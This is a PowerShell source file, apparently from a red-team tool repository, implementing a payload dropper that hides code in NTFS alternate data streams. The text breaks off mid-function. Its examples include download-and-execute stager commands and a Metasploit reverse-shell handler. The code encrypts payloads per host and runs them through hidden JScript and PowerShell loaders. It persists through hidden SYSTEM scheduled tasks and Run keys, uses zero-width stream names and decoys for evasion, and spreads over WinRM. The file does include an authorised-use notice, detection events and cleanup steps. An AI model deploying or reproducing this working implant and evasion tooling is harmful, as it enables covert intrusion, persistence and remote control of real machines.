<#
.DESCRIPTION ADS-Dropper hides arbitrary payloads in NTFS Alternate Data Streams (ADS), executes them via native Windows binaries (VBScript/PowerShell), and persists through multiple methods (Scheduled Tasks, Registry Run Keys).
Supports any C2 framework (Realm Imix, Metasploit, Sliver) or custom commands.
Includes AES-256 encryption, randomization, and privilege adaptation.
.PARAMETER Payload [REQUIRED] The payload to deploy. Accepts: - String: PowerShell command or script - Array: File path to payload script (e.g., @('payload.ps1'))
Examples:
  "IEX (New-Object Net.WebClient).DownloadString('http://c2/stager.ps1')"
  @('C:\payloads\imix_stager.ps1')
  "Write-Output 'Beacon' | Out-File C:\beacon.log -Append"
.PARAMETER Targets Target hosts for deployment. Default: @('localhost')
- 'localhost' = Local deployment
- Remote IPs/hostnames = Lateral movement via WinRM (requires -Credential)

Examples:
  -Targets @('localhost')
  -Targets @('10.10.10.50', 'dc01.corp.local')
.PARAMETER Persist Persistence method. Default: 'task'
Available methods:
  task     - Scheduled Task (requires admin, logon + startup + periodic triggers)
  registry - Registry Run key (works as user or admin, companion task for periodic)
  wmi      - WMI event subscription (not yet implemented)
  none     - No persistence (ADS only)

Examples:
  -Persist task
  -Persist registry
.PARAMETER Randomize Enable randomization for evasion: - Random file/stream names (mimics legitimate Windows ADS) - Random loader names (app_log_*.vbs/ps1) - Random task names (GUIDs)
Breaks signature-based detection but makes cleanup harder.

Example:
  -Randomize
.PARAMETER Encrypt Enable AES-256 encryption of payload in ADS.
- Key derived from machine UUID + hostname (deterministic per-system)
- Automatically switches to PowerShell loader (VBScript can't decrypt)
- Payload stored as Base64-encoded ciphertext

Example:
  -Encrypt
.PARAMETER NoExec Stage artifacts (ADS, loader, persistence) WITHOUT executing.
Use for:
- Pre-staging during recon phase
- Testing deployment without triggering C2 callbacks
- Verifying artifacts before execution

Example:
  -NoExec
.PARAMETER Credential PSCredential for remote deployment (WinRM authentication).
Required when -Targets includes remote hosts.

Example:
  -Credential (Get-Credential)
.EXAMPLE # Basic local deployment (unencrypted, scheduled task) .\ADS-Dropper.ps1 -Payload "Write-Output 'Test' | Out-File C:\test.log"
Description:
Stores payload in C:\ProgramData\SystemCache.dat:syc_payload
Creates VBScript loader at C:\ProgramData\app_log_a.vbs
Registers scheduled task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
Executes immediately
.EXAMPLE # Encrypted deployment with randomization (RECOMMENDED FOR OPSEC) $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/imix.ps1')" .\ADS-Dropper.ps1 -Payload $payload -Encrypt -Randomize
Description:
- AES-256 encrypts payload (key from UUID+hostname)
- Random file: C:\ProgramData\CacheSvc.log
- Random stream: :SmartScreen or :Zone.Identifier
- Random loader: app_log_kqmxyz.ps1 (PowerShell for decryption)
- Random task: \Microsoft\Windows\UX\a3f5b2c1
.EXAMPLE # Registry persistence .\ADS-Dropper.ps1 -Payload $c2Stager -Persist registry -Encrypt
Description:
Creates registry Run key persistence:
- HKCU Run key (logon trigger) + HKLM Run key if admin (startup trigger)
- Companion scheduled task for periodic execution + cheeky triggers (OnIdle, OnUnlock)
.EXAMPLE # Stage without execution (recon phase) .\ADS-Dropper.ps1 -Payload $payload -NoExec -Verbose
Description:
Creates all artifacts (ADS, loader, scheduled task) but does NOT execute.
Use -Verbose to see deployment details.
Manually trigger later via: wscript.exe //B C:\ProgramData\app_log_a.vbs
.EXAMPLE # Lateral movement to multiple hosts $cred = Get-Credential # Prompt for domain\user credentials $targets = @('10.10.10.50', '10.10.10.51', 'dc01.corp.local') .\ADS-Dropper.ps1 -Payload $msfStager -Targets $targets -Credential $cred -Encrypt -Randomize
Description:
- Deploys to 3 remote hosts via WinRM
- Serializes functions and executes remotely
- Each host gets unique random artifacts (if -Randomize)
.EXAMPLE # Realm C2 (Imix agent) deployment - CCDC scenario $imixStager = Get-Content .\imix_stager.txt -Raw # Base64 from Realm console .\ADS-Dropper.ps1 -Payload $imixStager -Persist task -Encrypt -Randomize -Verbose
Description:
Full stealth deployment:
- Encrypted Imix stager
- Randomized artifacts (evades signatures)
- Dual persistence (task + registry)
- Verbose output for verification
.EXAMPLE # Metasploit reverse shell # First, generate stager with msfvenom: # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f psh-cmd
$msfPayload = 'IEX (New-Object Net.WebClient).DownloadString("http://192.168.1.100/payload.ps1")'
.\ADS-Dropper.ps1 -Payload $msfPayload -Persist task -Encrypt

Description:
Deploys Metasploit stager with encryption.
Start MSF handler: msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; exploit"
.EXAMPLE # Sliver implant deployment $sliverStager = @('C:\payloads\sliver_beacon.ps1') # Generated by Sliver .\ADS-Dropper.ps1 -Payload $sliverStager -Persist registry -Randomize -Encrypt
Description:
Deploys Sliver beacon from file with registry Run key persistence.
.EXAMPLE # Custom persistent command (non-C2) $customBeacon = @' while($true) { "$(Get-Date) - Beacon alive" | Out-File C:\beacon.log -Append Start-Sleep -Seconds 300 } '@ .\ADS-Dropper.ps1 -Payload $customBeacon -Persist registry
Description:
Simple persistent beacon (writes to log every 5 minutes).
No C2 connection, useful for testing persistence without network traffic.
.NOTES File Name : ADS-Dropper.ps1 Author : Qweary (https://github.com/Qweary) Prerequisite : PowerShell 5.1+, NTFS filesystem, Windows 10+ Version : 2.3
MITRE ATT&CK Mapping:
- T1564.004: Hide Artifacts - NTFS File Attributes
- T1053.005: Scheduled Task/Job
- T1547.001: Boot or Logon Autostart Execution - Registry Run Keys

Detection:
- Sysmon Event ID 15 (FileCreateStreamHash) - ADS creation
- Windows Event ID 4698 (Task Created)
- Windows Event ID 4657 (Registry modification)

Cleanup:
Run tests/cleanup.ps1 to remove all artifacts:
  .\tests\cleanup.ps1 -Targets @('localhost')
.LINK GitHub: https://github.com/Qweary/Apparition-Delivery-System Blog: https://qweary.github.io
Research Credits:
- Oddvar Moe: https://oddvar.moe (ADS execution techniques)
- Enigma0x3: https://enigma0x3.net (ADS persistence patterns)
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1564/004/
.OUTPUTS Console output showing deployment progress: - Admin status - Target hosts - Persistence methods - ADS creation confirmation - Loader path - Success/failure status
For remote deployments, returns hashtable with:
- Success (bool)
- Artifacts (hashtable with ADS path, loader path)
- Error (string, if failed)
.COMPONENT Requires NTFS filesystem (ADS not supported on FAT32/exFAT) Requires PowerShell remoting (WinRM) for lateral movement
.ROLE Red Team / Penetration Testing
AUTHORIZED USE ONLY:
- Penetration testing with written permission
- CCDC and similar competitive exercises
- Security research in isolated labs

Unauthorized use is illegal and unethical.
.FUNCTIONALITY Persistence, Execution, Defense Evasion
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Payload,
    
    [switch]$PayloadAtRuntime,
    [string[]]$Targets = @('localhost'),
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [switch]$Randomize,
    [switch]$Encrypt,
    [switch]$ZeroWidthStreams,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [string]$ManifestPath,
    [switch]$NoExec,
    [PSCredential]$Credential,
    [switch]$Help,
    
    # Deep placement - bury ADS in legitimate Windows subdirectories
    [switch]$UseDeepPlacement,
    # Attach to existing file instead of creating a new host file
    [switch]$AttachToExisting,
    
    [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
    [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

    # Periodic execution interval in minutes (always added to tasks)
    [ValidateRange(1, 1440)]
    [int]$PeriodicMinutes = 5,

    # Jitter as percentage of interval — randomizes timing to break pattern detection
    [ValidateRange(0, 50)]
    [int]$JitterPercent = 20,

    [switch]$GenerateOnly
)

# Help display function
function Show-Help {
    $helpText = @"
===============================================================================
  ADS-Dropper v2.3 - Quick Reference
===============================================================================
USAGE: .\ADS-Dropper.ps1 -Payload <string|file> [OPTIONS]

REQUIRED:
  -Payload <string|array>   Payload to deploy (command or @('file.ps1'))

OPTIONAL:
  -Targets <array>          Target hosts (default: @('localhost'))
  -Persist <string>         Persistence method: task, registry, wmi, none
  -Trigger <string[]>       Trigger types: AtLogOn, AtStartup, OnIdle, OnUnlock
  -PeriodicMinutes <int>    Periodic interval in minutes (default: 5)
  -JitterPercent <int>      Jitter percentage for timing (default: 20)
  -Randomize                Randomize artifacts for evasion
  -Encrypt                  AES-256 encrypt payload
  -NoExec                   Stage without executing
  -Credential <PSCredential> Creds for remote deployment

QUICK START EXAMPLES:
  Local deployment (basic)
    .\ADS-Dropper.ps1 -Payload "Write-Output 'Test'"

  Full stealth (RECOMMENDED)
    .\ADS-Dropper.ps1 -Payload $c2Stager -Encrypt -Randomize

  Registry persistence
    .\ADS-Dropper.ps1 -Payload $payload -Persist registry -Encrypt

  Lateral movement
    $cred = Get-Credential
    .\ADS-Dropper.ps1 -Payload $payload -Targets @('dc01') -Credential $cred

PERSISTENCE METHODS:
  task      Scheduled Task (admin required)
            Triggers: AtLogOn + AtStartup + periodic (configurable)
            Cheeky triggers: OnIdle, OnUnlock
            Path: \Microsoft\Windows\UX* or ...\UsbCeip

  registry  Registry Run Key (user or admin)
            HKCU (AtLogOn) + HKLM if admin (AtStartup)
            Companion task for periodic + cheeky triggers
            Fallback to HKCU if not admin

ENCRYPTION:
  -Encrypt enables AES-256 with machine-specific key (UUID+hostname)
  Pros: Prevents static analysis, evades content-based detection
  Cons: Requires PowerShell loader (more telemetry than VBScript)

RANDOMIZATION:
  -Randomize generates unique artifacts per deployment:
    File:   SystemCache.dat -> CacheSvc.log
    Stream: :syc_payload -> :SmartScreen or :Zone.Identifier
    Loader: app_log_a.vbs -> app_log_kqmxyz.vbs
    Task:   UsbCeip -> a3f5b2c1-... (GUID)

C2 FRAMEWORK EXAMPLES:
  Realm C2 (Imix agent)
    $imix = Get-Content .\imix_stager.txt -Raw
    .\ADS-Dropper.ps1 -Payload $imix -Encrypt -Randomize

  Metasploit
    $msf = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/m.ps1")'
    .\ADS-Dropper.ps1 -Payload $msf -Persist task

  Sliver
    $sliver = @('C:\payloads\sliver.ps1')
    .\ADS-Dropper.ps1 -Payload $sliver -Encrypt

DETECTION & CLEANUP:
  Blue team detection:
    - Sysmon Event ID 15 (ADS creation)
    - Event ID 4698 (Task creation)
    - Event ID 4657 (Registry modification)
    - PowerShell: Get-ChildItem C:\ProgramData -Stream *
  Cleanup artifacts: .\tests\cleanup.ps1 -Targets @('localhost')

TESTING:
  Validation suite: .\tests\validate.ps1
  Manual verification:
    dir /r C:\ProgramData           # Show ADS
    schtasks /query /fo LIST         # Show tasks
    reg query HKCU\...\Run          # Check registry

MORE INFO:
  Full help:    Get-Help .\ADS-Dropper.ps1 -Full
  Examples:     Get-Help .\ADS-Dropper.ps1 -Examples
  Parameters:   Get-Help .\ADS-Dropper.ps1 -Parameter *

GitHub: https://github.com/Qweary/Apparition-Delivery-System
Blog:   https://qweary.github.io

ETHICAL USE ONLY - AUTHORIZED TESTING WITH PERMISSION REQUIRED
"@
    Write-Host $helpText -ForegroundColor Cyan
}

# Help flag intercept
if ($Help -or $args -contains '-h' -or $args -contains '--help' -or 
    $args -contains '-?' -or $args -contains '/?' -or 
    (!$PSBoundParameters.ContainsKey('Payload') -and $args.Count -eq 0)) {
    Show-Help
    exit 0
}

# Main Execution Logic Begins

#region Zero-Width Unicode Functions

# Verified zero-width Unicode codepoints
$script:ZeroWidthChars = @(
    0x061C,  # Arabic Letter Mark
    0x180E,  # Mongolian Vowel Separator
    0x200B,  # Zero Width Space
    0x200C,  # Zero Width Non-Joiner
    0x200D,  # Zero Width Joiner
    0x200E,  # Left-to-Right Mark
    0x200F,  # Right-to-Left Mark
    0x202A,  # LTR Embedding
    0x202B,  # RTL Embedding
    0x202C,  # Pop Directional
    0x202D,  # LTR Override
    0x202E,  # RTL Override
    0x2060,  # Word Joiner
    0xFEFF   # Zero Width No-Break Space
)

function Generate-ZeroWidthStream {
    <#
    .SYNOPSIS
        Generates zero-width Unicode stream name
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [ValidateSet('single', 'multi', 'hybrid')]
        [string]$Mode = 'single',

        [string]$Prefix,

        [ValidateRange(2, 5)]
        [int]$Length = 3
    )

    try {
        switch ($Mode) {
            'single' {
                $char = [char]($script:ZeroWidthChars | Get-Random)
                return $char
            }
            
            'multi' {
                $chars = @()
                for ($i = 0; $i -lt $Length; $i++) {
                    $chars += [char]($script:ZeroWidthChars | Get-Random)
                }
                return -join $chars
            }
            
            'hybrid' {
                # Legitimate stream names
                $legitNames = @('Zone.Identifier', 'Summary', 'Comments', 'Author')
                
                if ([string]::IsNullOrEmpty($Prefix)) {
                    $Prefix = $legitNames | Get-Random
                }
                
                $suffix = [char]($script:ZeroWidthChars | Get-Random)
                return "$Prefix$suffix"
            }
        }
    } catch {
        Write-Verbose "Zero-width generation failed, using fallback"
        return -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
    }
}

function Get-ZeroWidthCodepoints {
    <#
    .SYNOPSIS
        Returns Unicode codepoints for a stream name
    #>
    [CmdletBinding()]
    param([string]$StreamName)

    $chars = $StreamName.ToCharArray()
    $codepoints = ($chars | ForEach-Object { "U+{0:X4}" -f [int]$_ }) -join ' '
    $bytes = ([System.Text.Encoding]::Unicode.GetBytes($StreamName) | 
              ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '

    return [PSCustomObject]@{
        StreamName = $StreamName
        Codepoints = $codepoints
        ByteSequence = $bytes
        CharCount = $chars.Length
        ContainsZeroWidth = ($chars | Where-Object { 
            $script:ZeroWidthChars -contains [int]$_ 
        }).Count -gt 0
    }
}

function ConvertFrom-Codepoints {
    <#
    .SYNOPSIS
        Reconstructs stream name from codepoint string
    #>
    [CmdletBinding()]
    param([string]$Codepoints)

    try {
        $points = $Codepoints -split '\s+' | ForEach-Object {
            $cleaned = $_ -replace '^(U\+|0x)', ''
            [int]"0x$cleaned"
        }
        return -join ($points | ForEach-Object { [char]$_ })
    } catch {
        Write-Error "Failed to reconstruct from codepoints: $_"
        return $null
    }
}

#endregion

#region Manifest Functions (Linux-side only)

function Create-ManifestEntry {
    <#
    .SYNOPSIS
        Creates manifest entry for tracking (Linux operator machine)
    #>
    [CmdletBinding()]
    param(
        [string]$TargetHost,
        [string]$FilePath,
        [string]$StreamName,
        [string]$PayloadHash,
        [string]$PersistenceMethod
    )

    $info = Get-ZeroWidthCodepoints -StreamName $StreamName

    return [PSCustomObject]@{
        EntryId = [guid]::NewGuid().ToString()
        Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss UTC")
        TargetHost = $TargetHost
        FilePath = $FilePath
        StreamName = $StreamName
        Codepoints = $info.Codepoints
        PayloadHash = $PayloadHash
        PersistenceMethod = $PersistenceMethod
        OperatorUsername = $env:USER
        OperatorHostname = hostname
    }
}

function Save-ManifestToLinux {
    <#
    .SYNOPSIS
        Saves manifest to Linux operator machine (NOT Windows target)
    #>
    [CmdletBinding()]
    param(
        [PSCustomObject[]]$Entries,
        [string]$OutputPath
    )

    try {
        $json = $Entries | ConvertTo-Json -Depth 10
        
        if (-not (Test-Path (Split-Path $OutputPath))) {
            New-Item -Path (Split-Path $OutputPath) -ItemType Directory -Force | Out-Null
        }

        $json | Out-File -FilePath $OutputPath -Encoding UTF8
        Write-Verbose "Manifest saved to: $OutputPath"
    } catch {
        Write-Error "Failed to save manifest: $_"
    }
}

#endregion

#region Payload Encryption

function Get-HostDerivedKey {
    <#
    .SYNOPSIS
        Derives AES-256 key from target host properties
    #>
    try {
        $hostInfo = @(
            $env:COMPUTERNAME
            (Get-WmiObject Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
            (Get-WmiObject Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber
        ) -join '|'

        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        return $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($hostInfo))
    } catch {
        Write-Warning "Host key derivation failed, using fallback"
        return [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
    }
}

function Protect-Payload {
    <#
    .SYNOPSIS
        Encrypts payload with AES-256
    #>
    param([string]$PlainText, [byte[]]$Key)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    $aes.GenerateIV()

    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)

    $result = $aes.IV + $encryptedBytes
    return [Convert]::ToBase64String($result)
}

function Unprotect-Payload {
    <#
    .SYNOPSIS
        Decrypts payload with AES-256
    #>
    param([string]$EncryptedData, [byte[]]$Key)

    $encryptedBytes = [Convert]::FromBase64String($EncryptedData)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $Key
    
    $iv = $encryptedBytes[0..15]
    $ciphertext = $encryptedBytes[16..($encryptedBytes.Length - 1)]
    
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    
    $plainBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

#endregion

#region ADS Operations

function Get-RandomADSConfig {
    <#
    .SYNOPSIS
        Generates ADS configuration with optional deep directory placement
    #>
    [CmdletBinding()]
    param(
        [switch]$UseZeroWidth,
        [string]$ZwMode = 'single',
        [string]$ZwPrefix,
        [switch]$UseDeepPlacement,
        [switch]$AttachToExisting
    )

    # --- Host path selection ---
    # Deep placement and AttachToExisting are RUNTIME features.
    # When running on Linux (GenerateOnly), we emit a placeholder path.
    # The OneLiner injects runtime code that overrides $hp on the target.
    # When running on Windows directly, we resolve here.

    $_isWin = [bool]$env:ProgramData

    if ($_isWin -and ($UseDeepPlacement -or $AttachToExisting)) {
        # Running directly on Windows — resolve deep path now
        $deepDirs = @(
            "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
            "$env:ProgramData\Microsoft\Windows\WER\Temp",
            "$env:LOCALAPPDATA\Microsoft\Windows\Caches",
            "$env:LOCALAPPDATA\Microsoft\Windows\WebCache",
            "$env:WINDIR\Temp",
            "$env:ProgramData\Microsoft\Diagnosis",
            "$env:ProgramData\Microsoft\Windows\Power Efficiency Diagnostics",
            "$env:ProgramData\Microsoft\Network\Downloader"
        )

        $validDirs = $deepDirs | Where-Object { Test-Path $_ }

        if ($AttachToExisting -and $validDirs) {
            # Find an existing file to parasitize
            $hostPath = $null
            foreach ($dir in ($validDirs | Get-Random -Count ([Math]::Min(3, $validDirs.Count)))) {
                $candidate = Get-ChildItem -Path $dir -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.Length -gt 0 -and $_.Length -lt 5MB } |
                    Select-Object -First 10 | Get-Random
                if ($candidate) {
                    $hostPath = $candidate.FullName
                    Write-Verbose "Attaching to existing file: $hostPath"
                    break
                }
            }
            # Fallback to deep placement if no suitable file found
            if (-not $hostPath) {
                Write-Verbose "No existing file found, falling back to deep placement"
                $UseDeepPlacement = $true
                $AttachToExisting = $false
            }
        }

        if ($UseDeepPlacement -and -not $hostPath) {
            $targetDir = $validDirs | Get-Random
            if ($targetDir) {
                $legitNames = @('Report.wer','etl_data.log','WPR_initiated.dat',
                                'snapshot.etl','diag_report.xml','cache_entry.dat',
                                'qmgr0.dat','aria-debug.log','session.etl')
                $fileName = if ($Randomize) { $legitNames | Get-Random } else { 'cache_entry.dat' }
                $hostPath = Join-Path $targetDir $fileName
            }
        }
    }

    # Default / Linux fallback path
    if (-not $hostPath) {
        if ($env:ProgramData) {
            $hostPath = if ($Randomize) {
                Join-Path $env:ProgramData (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ }))
            } else {
                Join-Path $env:ProgramData "SystemCache.dat"
            }
        } else {
            # Running on Linux — construct Windows path manually
            if ($Randomize) {
                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
                $hostPath = "C:\ProgramData\$randomName"
            } else {
                $hostPath = "C:\ProgramData\SystemCache.dat"
            }
        }
    }
   
    $streamName = if ($UseZeroWidth) {
        Generate-ZeroWidthStream -Mode $ZwMode -Prefix $ZwPrefix
    } else {
        if ($Randomize) {
            -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        } else {
            'payload'
        }
    }

    return @{
        HostPath = $hostPath
        StreamName = $streamName
        Codepoints = (Get-ZeroWidthCodepoints -StreamName $streamName).Codepoints
    }
}

function Create-DecoyStreams {
    <#
    .SYNOPSIS
        Creates benign decoy ADS
    #>
    [CmdletBinding()]
    param([string]$HostPath, [int]$Count = 3)

    if ($Count -le 0) { return }

    $decoyNames = @(':Zone.Identifier', ':Summary', ':Comments', ':Author')
    $benignContent = @(
        "[ZoneTransfer]`r`nZoneId=3",
        "Document summary information",
        "Internal use only"
    )

    for ($i = 0; $i -lt [Math]::Min($Count, $decoyNames.Count); $i++) {
        $content = $benignContent | Get-Random
        try {
            $content | Set-Content -Path "$HostPath$($decoyNames[$i])" -Force
            Write-Verbose "Created decoy: $($decoyNames[$i])"
        } catch {
            Write-Warning "Failed to create decoy $($decoyNames[$i]): $_"
        }
    }
}

function Write-ADSPayload {
    <#
    .SYNOPSIS
        Writes payload to ADS
    #>
    [CmdletBinding()]
    param(
        [string]$HostPath,
        [string]$StreamName,
        [string]$PayloadContent,
        [switch]$EncryptPayload
    )

    try {
        # Ensure host file exists
        if (-not (Test-Path $HostPath)) {
            New-Item -Path $HostPath -ItemType File -Force | Out-Null
        }

        # Encrypt if requested
        $finalPayload = if ($EncryptPayload) {
            $key = Get-HostDerivedKey
            Protect-Payload -PlainText $PayloadContent -Key $key
        } else {
            $PayloadContent
        }

        # Write to ADS
        $adsPath = "$HostPath`:$StreamName"
        $finalPayload | Set-Content -Path $adsPath -Force
        
        Write-Verbose "Payload written to: $adsPath"
        return $adsPath
    } catch {
        Write-Error "Failed to write ADS: $_"
        return $null
    }
}

#endregion

#region Persistence

function Build-Loader {
    <#
    .SYNOPSIS
        Generates PowerShell loader for ADS
    #>
    param(
        [string]$HostPath,
        [string]$StreamName,
        [switch]$IsEncrypted
    )

    if ($IsEncrypted) {
        return @"
`$k = Get-HostDerivedKey
`$e = Get-Content '$HostPath`:$StreamName' -Raw
`$p = Unprotect-Payload -EncryptedData `$e -Key `$k
IEX `$p
"@
    } else {
        return @"
`$p = Get-Content '$HostPath`:$StreamName' -Raw
IEX `$p
"@
    }
}

function Build-JScriptWrapper {
    <#
    .SYNOPSIS
        Generates JScript source that launches PowerShell completely hidden.

    .PARAMETER ADSFullPath
        Full ADS path including stream, e.g. "C:\ProgramData\file.dat:stream"

    .PARAMETER IsEncrypted
        Embeds Get-HostKey + Dec decryption functions inline.

    .OUTPUTS
        [string]  JScript source code, ASCII-safe.
    #>
    [CmdletBinding()]
    [OutputType([string])]
    param(
        [Parameter(Mandatory)]
        [string]$ADSFullPath,

        [switch]$IsEncrypted
    )

    # Escape backslashes for JScript string context.
    # In .NET:  -replace '\\' matches literal \, replacement '\\' is literal \\.
    # Result: C:\Path -> C:\\Path  (correct for JScript string literals).
    $jsPath = $ADSFullPath -replace '\\', '\\'

    if ($IsEncrypted) {
        # --- Literal here-string: zero PowerShell expansion. ---
        # Every $ passes through verbatim into the JScript output,
        # which is exactly what we need because PowerShell interprets
        # them at Layer 4 (when the -Command string executes).
        #
        # The pipe character | is encoded as [char]124 in the -join
        # to sidestep any edge-case shell interpretation.  The rest
        # of the decryption logic is the same Get-HostKey / Dec pair
        # used everywhere else, flattened to single-line form.
        $template = @'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "function Get-HostKey{" +
        "$h=@($env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join[char]124;" +
        "[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes($h))" +
    "};" +
    "function Dec($d,$k){" +
        "$b=[Convert]::FromBase64String($d);" +
        "$a=[Security.Cryptography.Aes]::Create();" +
        "$a.Key=$k;$a.IV=$b[0..15];" +
        "$c=$a.CreateDecryptor();" +
        "$t=$b[16..($b.Length-1)];" +
        "$p=$c.TransformFinalBlock($t,0,$t.Length);" +
        "[Text.Encoding]::UTF8.GetString($p)" +
    "};" +
    "$k=Get-HostKey;" +
    "$e=Get-Content '__ADSPATH__' -Raw;" +
    "$p=Dec $e $k;" +
    "IEX $p" +
    "\"";
shell.Run(cmd, 0, false);
'@
        return $template.Replace('__ADSPATH__', $jsPath)
    }
    else {
        $template = @'
var shell = new ActiveXObject("WScript.Shell");
var cmd = "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" +
    "IEX(Get-Content '__ADSPATH__' -Raw)" +
    "\"";
shell.Run(cmd, 0, false);
'@
        return $template.Replace('__ADSPATH__', $jsPath)
    }
}

function Create-ScheduledTaskPersistence {
    <#
    .SYNOPSIS
        Creates a scheduled task that executes via a JScript wrapper
        to guarantee zero visible windows.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$HostPath,

        [Parameter(Mandatory)]
        [string]$StreamName,

        [string]$TaskName,

        [ValidateSet('AtLogOn', 'AtStartup', 'OnIdle', 'OnUnlock')]
        [string[]]$Trigger = @('AtLogOn', 'AtStartup'),

        [int]$PeriodicMinutes = 5,
        [int]$JitterPercent = 20,

        [switch]$IsEncrypted
    )

    try {
        # --- Task name ---
        if ([string]::IsNullOrEmpty($TaskName)) {
            $TaskName = if ($Randomize) {
                "WinSAT_" + (-join ((65..90) | Get-Random -Count 6 | ForEach-Object { [char]$_ }))
            } else {
                "SystemOptimization"
            }
        }

        # --- Generate JScript wrapper ---
        $adsFullPath = "${HostPath}:${StreamName}"
        $jsContent = Build-JScriptWrapper -ADSFullPath $adsFullPath -IsEncrypted:$IsEncrypted

        # --- Choose save location (co-locate with host file) ---
        $hostDir = Split-Path $HostPath -Parent
        if (-not $hostDir -or -not (Test-Path $hostDir)) {
            $hostDir = $env:ProgramData
        }

        $jsFileName = if ($Randomize) {
            $prefixes = @('msupdate','windiag','perfmon_report','etw_session','wer_diag','mrt_scan')
            $prefix  = $prefixes | Get-Random
            $suffix  = -join ((48..57) + (97..102) | Get-Random -Count 6 | ForEach-Object { [char]$_ })
            "${prefix}_${suffix}.js"
        } else {
            "syshealth_check.js"
        }

        $jsPath = Join-Path $hostDir $jsFileName

        # --- Write to disk (ASCII — wscript chokes on UTF-8 BOM) ---
        $jsContent | Out-File -FilePath $jsPath -Encoding ASCII -Force
        Write-Verbose "JScript wrapper saved: $jsPath"

        # --- Task action: wscript.exe //B //E:JScript "wrapper.js" ---
        $action = New-ScheduledTaskAction -Execute "wscript.exe" `
            -Argument "//B //E:JScript `"$jsPath`""

        # --- Compute jitter delays ---
        $jitterDelay = $null
        if ($JitterPercent -gt 0) {
            $jitterMinutes = [Math]::Max(1, [Math]::Round($PeriodicMinutes * $JitterPercent / 100))
            $jitterDelay = New-TimeSpan -Minutes $jitterMinutes
        }

        # --- Build trigger array from all specified triggers ---
        $triggers = @()
        foreach ($t in $Trigger) {
            switch ($t) {
                'AtLogOn' {
                    $tObj = New-ScheduledTaskTrigger -AtLogOn
                    if ($jitterDelay) { $tObj.RandomDelay = $jitterDelay }
                    $triggers += $tObj
                }
                'AtStartup' {
                    $tObj = New-ScheduledTaskTrigger -AtStartup
                    if ($jitterDelay) { $tObj.RandomDelay = $jitterDelay }
                    $triggers += $tObj
                }
                'OnIdle' {
                    # CIM idle trigger — fires when the system enters idle state
                    $tObj = New-CimInstance -CimClass (
                        Get-CimClass MSFT_TaskIdleTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
                    ) -ClientOnly
                    $triggers += $tObj
                }
                'OnUnlock' {
                    # CIM session state change — fires every time a user unlocks (cheeky!)
                    $tObj = New-CimInstance -CimClass (
                        Get-CimClass MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
                    ) -Property @{ StateChange = [uint32]8 } -ClientOnly  # 8 = SessionUnlock (TASK_SESSION_STATE_CHANGE_TYPE)
                    if ($jitterDelay) { $tObj.RandomDelay = "PT$($jitterDelay.TotalMinutes)M" }
                    $triggers += $tObj
                }
            }
        }

        # Always add periodic trigger for interval execution
        $triggerPeriodic = New-ScheduledTaskTrigger -Once `
            -At (Get-Date).AddMinutes(1) `
            -RepetitionInterval (New-TimeSpan -Minutes $PeriodicMinutes) `
            -RepetitionDuration (New-TimeSpan -Days 9999)
        if ($jitterDelay) { $triggerPeriodic.RandomDelay = $jitterDelay }
        $triggers += $triggerPeriodic

        # --- Task settings (add idle config if OnIdle trigger is present) ---
        $settingsParams = @{
            AllowStartIfOnBatteries    = $true
            DontStopIfGoingOnBatteries = $true
            Hidden                     = $true
        }
        if ($Trigger -contains 'OnIdle') {
            $settingsParams.IdleDuration    = New-TimeSpan -Minutes 10
            $settingsParams.IdleWaitTimeout  = New-TimeSpan -Hours 1
        }
        $settings = New-ScheduledTaskSettingsSet @settingsParams

        $principal = New-ScheduledTaskPrincipal `
            -UserId "SYSTEM" `
            -LogonType ServiceAccount `
            -RunLevel Highest

